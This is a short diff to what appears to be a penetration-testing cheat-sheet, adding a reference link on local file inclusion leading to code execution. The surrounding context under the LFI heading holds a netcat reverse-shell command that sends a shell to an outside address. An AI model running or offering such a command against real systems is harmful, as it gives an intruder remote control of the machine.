@@ -41,6 +41,7 @@ few scripts and useful commands
 <p>LFI</p>
 <ul>
 <li>/bin/nc 192.168.91.1 1234 -e /bin/sh /bin</li>
+<li> https://resources.infosecinstitute.com/local-file-inclusion-code-execution/#gref </li>
 </ul>
 
 # post-exploitation
